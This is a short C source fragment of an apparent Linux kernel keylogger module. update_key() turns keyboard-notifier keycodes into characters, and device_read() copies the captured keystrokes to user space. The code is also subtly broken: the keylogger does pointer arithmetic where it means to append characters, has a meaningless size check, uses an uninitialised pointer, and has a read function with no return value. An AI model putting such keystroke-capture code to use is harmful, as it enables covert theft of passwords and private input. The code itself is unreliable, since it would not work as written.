#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include "keys.h"
#define BUFF_SIZE 0x1000
static char *msg_Ptr;
char msg_Ptr_size[BUFF_SIZE];

void update_key(struct keyboard_notifier_param *p)
{
    char tav;  
    if (p->shift){
        /*hundle as shift*/
        tav = (char)keycode[p->value][1];
    }
    else
    {
        tav = (char)keycode[p->value][0];
    }
    if(sizeof(msg_Ptr+tav) < sizeof(char)*BUFF_SIZE){
        msg_Ptr+=tav;
    }
}

static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset)
{
    int bytes_read=0;
    if (*msg_Ptr ==0) return 0;
    while (length && *msg_Ptr){
        put_user(*(msg_Ptr++), buffer++);
        length--;
        bytes_read++;
    }
}